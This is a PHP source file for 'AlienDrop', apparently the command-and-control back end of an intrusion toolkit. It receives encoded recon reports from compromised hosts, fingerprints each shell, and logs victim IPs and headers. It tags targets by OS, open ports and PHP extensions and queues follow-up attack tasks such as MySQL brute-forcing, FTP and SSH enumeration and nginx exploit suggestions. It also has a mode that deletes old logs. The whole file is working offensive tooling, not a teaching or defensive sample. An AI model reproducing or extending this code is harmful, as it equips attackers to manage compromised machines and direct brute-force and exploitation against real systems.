<?php
// MINC - AlienDrop Local Recon Processor v3 (Task Brain + Tag AI + C2 Link Map)

header("Content-Type: text/plain");

// === CONFIG ===
$log_dir   = __DIR__ . "/output/recon";
$task_dir  = __DIR__ . "/auto_tasks";
$tag_dir   = __DIR__ . "/output/tags";
$meta_dir  = __DIR__ . "/output/graphmap";
$clean_mode = isset($_GET['clean']) && $_GET['clean'] === 'true';

// === UTILITY ===
function safe_mkdir($path) {
    if (!is_dir($path)) @mkdir($path, 0777, true);
}

function decode_payload($b64) {
    $json = @base64_decode($b64);
    return @json_decode($json, true);
}

function suggest_tasks($ports) {
    $tasks = [];
    foreach ($ports as $p) {
        if (!is_array($p)) continue;
        if ($p['port'] === 3306) $tasks[] = ["task" => "mysql_brute", "source" => "port 3306"];
        if ($p['port'] === 21)   $tasks[] = ["task" => "ftp_enum", "source" => "port 21"];
        if (in_array($p['port'], [80, 443])) {
            $tasks[] = ["task" => "web_recon", "source" => "web port"];
            if (isset($p['banner']) && stripos($p['banner'], 'nginx') !== false)
                $tasks[] = ["task" => "nginx_exploit_suggest", "source" => "banner match"];
        }
        if ($p['port'] === 22) $tasks[] = ["task" => "ssh_enum", "source" => "port 22"];
    }
    return $tasks;
}

function extract_tags($payload) {
    $tags = [];
    $sys = $payload['system']['os'] ?? '';
    $exts = $payload['php_exts'] ?? [];
    $ports = $payload['open_ports'] ?? [];

    if (stripos($sys, 'windows') !== false) $tags[] = "windows";
    if (stripos($sys, 'linux') !== false)   $tags[] = "linux";
    if (in_array('mysqli', $exts))          $tags[] = "db_ready";
    if (in_array('curl', $exts))            $tags[] = "net_capable";
    if ($payload['passive_mode'] ?? false)  $tags[] = "passive";

    foreach ($ports as $p) {
        if (!is_array($p)) continue;
        if ($p['port'] === 22) $tags[] = "ssh_host";
        if ($p['port'] === 3306) $tags[] = "mysql_host";
        if (in_array($p['port'], [80, 443])) $tags[] = "web_target";
    }

    return array_values(array_unique($tags));
}

function fingerprint_shell($payload) {
    $raw = $payload['system']['os'] . "|" . $payload['system']['hostname'] . "|" . implode(",", $payload['php_exts'] ?? []);
    return substr(sha1($raw), 0, 12);
}

function write_auto_tasks($recon_id, $tasks) {
    global $task_dir;
    safe_mkdir($task_dir);
    $path = "$task_dir/{$recon_id}.task";
    $raw = implode("\n", array_column($tasks, 'task')) . "\n";
    @file_put_contents($path, $raw);
    return $raw;
}

function write_task_json($recon_id, $tasks) {
    global $task_dir;
    $json_path = "$task_dir/{$recon_id}.json";
    @file_put_contents($json_path, json_encode($tasks, JSON_PRETTY_PRINT));
}

function write_tags($recon_id, $new) {
    global $tag_dir;
    safe_mkdir($tag_dir);
    $file = "$tag_dir/{$recon_id}.tags";
    $existing = [];
    if (file_exists($file)) {
        $existing = explode(",", trim(file_get_contents($file)));
    }
    $merged = array_unique(array_merge($existing, $new));
    @file_put_contents($file, implode(",", $merged));
}

function write_log($recon_id, $data) {
    global $log_dir;
    safe_mkdir($log_dir);
    $file = "$log_dir/{$recon_id}_" . time() . ".json";
    @file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function write_meta_link($recon_id, $payload) {
    global $meta_dir;
    safe_mkdir($meta_dir);
    $meta = [
        "recon_id" => $recon_id,
        "ip" => $_SERVER['REMOTE_ADDR'] ?? "unknown",
        "ua" => $_SERVER['HTTP_USER_AGENT'] ?? "none",
        "ts" => time()
    ];
    $file = "$meta_dir/{$recon_id}.link";
    @file_put_contents($file, json_encode($meta, JSON_PRETTY_PRINT));
}

function auto_clean_old() {
    global $log_dir, $task_dir;
    $now = time();
    foreach (glob("$log_dir/*.json") as $f) if (filemtime($f) < $now - 86400) @unlink($f);
    foreach (glob("$task_dir/*.task") as $f) if (filemtime($f) < $now - 86400) @unlink($f);
}

// === ENTRYPOINT ===
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['data'])) {
    http_response_code(403); echo "forbidden"; exit;
}

if ($clean_mode) { auto_clean_old(); echo "cleaned"; exit; }

$payload = decode_payload($_POST['data']);
if (!is_array($payload) || !isset($payload['recon_id'])) {
    echo "ok"; exit;
}

$recon_id = preg_replace('/[^a-z0-9]/i', '_', $payload['recon_id']);
$fingerprint = fingerprint_shell($payload);
$payload['_meta'] = [
    'timestamp' => time(),
    'source_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'headers'   => function_exists('getallheaders') ? @getallheaders() : [],
    'fingerprint' => $fingerprint
];

$task_objects = suggest_tasks($payload['open_ports'] ?? []);
$tags         = extract_tags($payload);

$payload['suggested_tasks'] = array_column($task_objects, 'task');
$payload['tags'] = $tags;

// Write all outputs
write_log($recon_id, $payload);
write_tags($recon_id, $tags);
write_auto_tasks($recon_id, $task_objects);
write_task_json($recon_id, $task_objects);
write_meta_link($recon_id, $payload);

echo "ok";
?>

